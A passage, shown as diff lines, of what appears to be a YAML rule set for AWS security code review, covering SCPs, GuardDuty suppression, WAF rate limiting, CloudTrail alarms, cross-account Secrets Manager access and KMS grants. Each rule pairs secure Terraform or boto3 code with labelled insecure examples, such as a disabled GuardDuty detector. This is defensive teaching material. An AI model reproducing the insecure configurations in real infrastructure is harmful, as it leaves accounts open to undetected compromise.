+    , \"sts:*\"]\n        Resource  = \"*\"\n        Condition = {\n          StringNotEquals = {\n            \"aws:RequestedRegion\"\
+    : [\"us-east-1\", \"us-west-2\"]\n          }\n        }\n      }\n    ]\n  })\n}\n"
+  example_bad: '# All accounts in root — no OU differentiation
+
+    # No SCPs — sandbox account can:
+
+    # - Launch p4d.24xlarge GPU instances ($32/hr)
+
+    # - Deploy in 25+ regions (surface area nightmare)
+
+    # - Disable CloudTrail (hide tracks)
+
+    # - Leave the organization (lose all governance)
+
+    '
+  when_applies: Projects using AWS cloud infrastructure, Organizations, or IAM
+  when_not_applies: purely internal tools with no external exposure, throwaway scripts, or local development utilities
+  sources: ["https://docs.aws.amazon.com/organizations/latest/userguide/orgs_manage_policies_scps.html"]
+- id: CR-AWS-GD-002
+  text: Configure GuardDuty suppression rules for known false positives — never disable GuardDuty or ignore findings.
+  why: GuardDuty generates false positives for legitimate activities (CI/CD accessing S3 from unusual IPs, known third-party
+    scanners, internal pen testing). Ignoring all findings or disabling GuardDuty because of noise means real threats are
+    also missed. Suppression rules filter SPECIFIC finding types matching SPECIFIC criteria while keeping all other detection
+    active.
+  how_to_do_right: 'Create suppression rules with tight filter criteria: specific finding type + specific resource + specific
+    IP range. Document why each suppression exists. Review suppressions quarterly. Never suppress broad finding types (e.g.,
+    all Recon:EC2 findings). Monitor suppressed finding counts to detect pattern changes.'
+  severity: high
+  technologies:
+    library: [guardduty]
+    platform: [aws]
+  domains:
+    domain: [security, operations]
+  example_good: "resource \"aws_guardduty_filter\" \"suppress_ci_access\" {\n  name        = \"suppress-ci-cd-s3-access\"\n\
+    \  detector_id = aws_guardduty_detector.main.id\n  action      = \"ARCHIVE\"  # Suppress (archive), not delete\n  rank\
+    \        = 1\n\n  finding_criteria {\n    criterion {\n      field  = \"type\"\n      equals = [\"UnauthorizedAccess:S3/MaliciousIPCaller.Custom\"\
+    ]\n    }\n    criterion {\n      field  = \"resource.accessKeyDetails.userName\"\n      equals = [\"ci-cd-service-account\"\
+    ]\n    }\n    criterion {\n      field  = \"service.action.awsApiCallAction.remoteIpDetails.ipAddressV4\"\n      equals\
+    \ = [\"203.0.113.0/24\"]  # CI/CD runner IP range\n    }\n  }\n}\n# Documented: \"CI/CD pipeline accesses S3 from GitHub\
+    \ Actions runners\n# in 203.0.113.0/24. This triggers false S3 unauthorized access findings.\n# Review quarterly. Last\
+    \ reviewed: 2026-01-15.\"\n"
+  example_bad: "# \"Too many findings, just disable it\"\nresource \"aws_guardduty_detector\" \"main\" {\n  enable = false\
+    \  # ALL threat detection disabled\n  # Cryptocurrency mining on EC2 → undetected\n  # IAM credential exfiltration → undetected\n\
+    \  # S3 data exfiltration → undetected\n}\n# Or: manually archiving all findings weekly without investigation\n"
+  when_applies: Projects using AWS cloud infrastructure or GuardDuty
+  when_not_applies: purely internal tools with no external exposure, throwaway scripts, or local development utilities. projects
+    not using AWS or GuardDuty
+  sources: ["https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-active.html"]
+- id: CR-AWS-WAF-003
+  text: Use WAF rate-based rules with IP-based and header-based rate limiting to protect against DDoS and credential stuffing.
+  why: Application-layer DDoS attacks (Layer 7) bypass network-level protections (Shield). Credential stuffing sends thousands
+    of login attempts per second from distributed IPs. Without rate limiting, your application processes every request, consuming
+    compute and potentially locking out legitimate users. WAF rate-based rules block IPs exceeding a threshold within a 5-minute
+    window automatically.
+  how_to_do_right: 'Create rate-based rules at multiple levels: global rate limit per IP (2000 req/5min for general API),
+    stricter limits for sensitive endpoints (100 req/5min for /login, /register). Use scope-down statements to apply different
+    rates to different paths. Combine with IP reputation managed rule group for known bad actors.'
+  severity: high
+  technologies:
+    library: [waf]
+    platform: [aws]
+  domains:
+    domain: [security, architecture]
+    concern: [web, ddos]
+  example_good: "# Strict rate limit on login endpoint\nrule {\n  name     = \"LoginRateLimit\"\n  priority = 5\n  action\
+    \ { block {} }\n  statement {\n    rate_based_statement {\n      limit              = 100  # 100 requests per 5 minutes\
+    \ per IP\n      aggregate_key_type = \"IP\"\n      scope_down_statement {\n        byte_match_statement {\n          search_string\
+    \         = \"/api/auth/login\"\n          field_to_match { uri_path {} }\n          text_transformation {\n         \
+    \   priority = 0\n            type     = \"LOWERCASE\"\n          }\n          positional_constraint = \"STARTS_WITH\"\
+    \n        }\n      }\n    }\n  }\n  visibility_config {\n    sampled_requests_enabled   = true\n    cloudwatch_metrics_enabled\
+    \ = true\n    metric_name                = \"LoginRateLimit\"\n  }\n}\n"
+  example_bad: '# No rate limiting on authentication endpoints
+
+    # Attacker: 10,000 login attempts/minute with credential lists
+
+    # Application: processes ALL requests, queries DB for each
+
+    # Result: database overloaded, legitimate users locked out
+
+    # No WAF rate rules → nothing stops the attack until manual intervention
+
+    '
+  when_applies: Projects using AWS cloud infrastructure or WAF
+  when_not_applies: purely internal tools with no external exposure, throwaway scripts, or local development utilities. projects
+    not using AWS or WAF
+  sources: ["https://docs.aws.amazon.com/waf/latest/developerguide/waf-rule-statement-type-rate-based.html"]
+- id: CR-AWS-CT-002
+  text: Create CloudWatch alarms on critical CloudTrail events — root login, IAM policy changes, security group changes, and
+    console logins without MFA.
+  why: CloudTrail records events but does not alert on them by default. A root login at 3am, a new IAM policy granting admin
+    access, or a security group opened to 0.0.0.0/0 can sit unnoticed for days or weeks. Real-time alarms on high-risk events
+    enable incident response within minutes instead of days.
+  how_to_do_right: 'Create a CloudWatch Logs metric filter on the CloudTrail log group for each critical event pattern. Create
+    a CloudWatch alarm on each metric. Send alarms to an SNS topic that notifies the security team via PagerDuty/Slack/email.
+    Critical events to monitor: root login, IAM policy changes, failed console logins, security group changes, NACL changes,
+    route table changes.'
+  severity: high
+  technologies:
+    library: [cloudtrail]
+    platform: [aws, cloudwatch]
+  domains:
+    domain: [security, observability]
+    concern: [incident-response]
+  example_good: "# Metric filter: root account login\nresource \"aws_cloudwatch_log_metric_filter\" \"root_login\" {\n  name\
+    \           = \"root-account-login\"\n  log_group_name = aws_cloudwatch_log_group.cloudtrail.name\n  pattern        =\
+    \ \"{ $.userIdentity.type = \\\"Root\\\" && $.userIdentity.invokedBy NOT EXISTS && $.eventType != \\\"AwsServiceEvent\\\
+    \" }\"\n  metric_transformation {\n    name      = \"RootAccountLogin\"\n    namespace = \"SecurityAlarms\"\n    value\
+    \     = \"1\"\n  }\n}\nresource \"aws_cloudwatch_metric_alarm\" \"root_login\" {\n  alarm_name          = \"root-account-login-detected\"\
+    \n  namespace           = \"SecurityAlarms\"\n  metric_name         = \"RootAccountLogin\"\n  comparison_operator = \"\
+    GreaterThanOrEqualToThreshold\"\n  threshold           = 1\n  evaluation_periods  = 1\n  period              = 60\n  statistic\
+    \           = \"Sum\"\n  alarm_actions       = [aws_sns_topic.security_alerts.arn]\n}\n\n# Metric filter: security group\
+    \ changes\nresource \"aws_cloudwatch_log_metric_filter\" \"sg_changes\" {\n  name           = \"security-group-changes\"\
+    \n  log_group_name = aws_cloudwatch_log_group.cloudtrail.name\n  pattern        = \"{ ($.eventName = AuthorizeSecurityGroupIngress)\
+    \ || ($.eventName = RevokeSecurityGroupIngress) || ($.eventName = CreateSecurityGroup) || ($.eventName = DeleteSecurityGroup)\
+    \ }\"\n  metric_transformation {\n    name      = \"SecurityGroupChanges\"\n    namespace = \"SecurityAlarms\"\n    value\
+    \     = \"1\"\n  }\n}\n"
+  example_bad: '# CloudTrail enabled but no alarms
+
+    # Root account compromised at 2am Saturday
+
+    # Attacker creates IAM user with admin access
+
+    # Attacker opens security groups, accesses databases
+
+    # Team discovers on Monday morning — 58 hours later
+
+    # All because nobody was watching the logs in real-time
+
+    '
+  when_applies: Projects using AWS cloud infrastructure, CloudTrail, or CloudWatch
+  when_not_applies: purely internal tools with no external exposure, throwaway scripts, or local development utilities
+  sources: ["https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-log-file-validation-intro.html"]
+- id: CR-AWS-SEC-003
+  text: Use Secrets Manager cross-account access with resource policies — never copy secrets between accounts.
+  why: Copying secrets between AWS accounts creates multiple copies that must all be rotated independently. When a secret
+    rotates in the source account, copies in other accounts become stale — services fail with authentication errors. Resource
+    policies on Secrets Manager allow cross-account access to a SINGLE secret, ensuring all consumers always use the current
+    value after rotation.
+  how_to_do_right: Attach a resource policy to the secret in the source account granting GetSecretValue to the consuming account's
+    role. The consuming account assumes their role and calls GetSecretValue with the full secret ARN (including the source
+    account ID). Use the caching client in the consuming account. No secret duplication needed.
+  severity: medium
+  technologies:
+    library: [secrets manager]
+    platform: [aws, iam]
+  domains:
+    domain: [security, operations]
+  example_good: "# Source account (111111111111): resource policy on secret\nresource \"aws_secretsmanager_secret_policy\"\
+    \ \"cross_account\" {\n  secret_arn = aws_secretsmanager_secret.shared_db.arn\n  policy = jsonencode({\n    Version =\
+    \ \"2012-10-17\"\n    Statement = [{\n      Sid       = \"AllowCrossAccountRead\"\n      Effect    = \"Allow\"\n     \
+    \ Principal = { AWS = \"arn:aws:iam::222222222222:role/app-service\" }\n      Action    = \"secretsmanager:GetSecretValue\"\
+    \n      Resource  = \"*\"\n    }]\n  })\n}\n\n# Consuming account (222222222222): read secret from source\n# No copy needed\
+    \ — always gets current rotated value\nsecret = client.get_secret_value(\n    SecretId='arn:aws:secretsmanager:us-east-1:111111111111:secret:shared-db-AbCdEf'\n\
+    )\n"
+  example_bad: '# Copying secrets between accounts
+
+    # Account A rotates DB password → "NewPassword456"
+
+    # Account B still has copy → "OldPassword123"
+
+    # Account B''s services: "Authentication failed"
+
+    # Manual fix: copy new password to Account B
+
+    # Repeat every 30 days when rotation runs
+
+    '
+  when_applies: Projects using AWS cloud infrastructure, Secrets Manager, or IAM
+  when_not_applies: purely internal tools with no external exposure, throwaway scripts, or local development utilities
+  sources: ["https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_common-scenarios_third-party.html"]
+- id: CR-AWS-KMS-004
+  text: Use KMS grants for temporary, scoped access to encryption keys — never add permanent key policy entries for ephemeral
+    access needs.
+  why: Key policies are the permanent access control for KMS keys. Adding entries for one-time operations (data migration,
+    cross-account backup, temporary debugging) and forgetting to remove them creates accumulated over-permissioning. Grants
+    provide temporary, scopeable access that can be easily revoked and automatically expire when the grantee entity is deleted.
+  how_to_do_right: 'Use grants for: cross-account operations, temporary access during migrations, access tied to a specific
+    IAM role lifecycle. Grants can limit operations (e.g., Decrypt only, no Encrypt). Retire grants when the operation is
+    complete. Use ListGrants to audit active grants periodically.'
+  severity: medium
+  technologies:
+    library: [kms]
+    platform: [aws]
+  domains:
+    domain: [security]
+    concern: [encryption]
+  example_good: "# Grant temporary decrypt access for data migration\nimport boto3\nkms = boto3.client('kms')\n\ngrant = kms.create_grant(\n\
+    \    KeyId='alias/production-data-key',\n    GranteePrincipal='arn:aws:iam::987654321098:role/MigrationRole',\n    Operations=['Decrypt'],\
+    \  # Only decrypt, cannot encrypt new data\n    Constraints={\n        'EncryptionContextSubset': {\n            'purpose':\
+    \ 'data-migration-2026-02'\n        }\n    },\n    Name='data-migration-feb-2026'\n)\n\n# After migration is complete:\n\
+    kms.retire_grant(\n    KeyId='alias/production-data-key',\n    GrantId=grant['GrantId']\n)\n"
+  example_bad: "# Adding permanent key policy entry for one-time migration\n{\n  \"Sid\": \"MigrationAccess\",\n  \"Effect\"\
+    : \"Allow\",\n  \"Principal\": { \"AWS\": \"arn:aws:iam::987654321098:role/MigrationRole\" },\n  \"Action\": [\"kms:Decrypt\"\
+    , \"kms:Encrypt\", \"kms:GenerateDataKey\"],\n  \"Resource\": \"*\"\n}\n# Migration completed 6 months ago\n# Role still\
+    \ has full encrypt/decrypt access\n# Nobody remembers why this entry exists\n# Cross-account key access persists indefinitely\n"
+  when_applies: Projects using AWS cloud infrastructure or KMS
+  when_not_applies: purely internal tools with no external exposure, throwaway scripts, or local development utilities. projects
+    not using AWS or KMS
+  sources: ["https://docs.aws.amazon.com/kms/latest/developerguide/key-policies.html"]
